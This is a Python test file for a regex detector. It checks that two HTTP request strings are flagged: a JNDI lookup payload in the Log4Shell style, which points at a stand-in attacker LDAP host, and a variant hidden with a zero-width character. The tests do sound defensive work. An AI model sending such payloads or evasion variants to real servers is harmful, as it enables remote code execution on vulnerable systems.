from detector.regex_baseline import predict_one


def test_regex_catches_plain_payload():
    payload = "GET /?q=${jndi:ldap://evil.example/a} HTTP/1.1"
    assert predict_one(payload).label == 1


def test_regex_scores_zero_width_evasion_after_canonicalization():
    payload = "GET /?q=${j\u200bndi:ldap://evil.example/a} HTTP/1.1"
    result = predict_one(payload)
    assert result.label == 1
    assert result.score >= 0.7
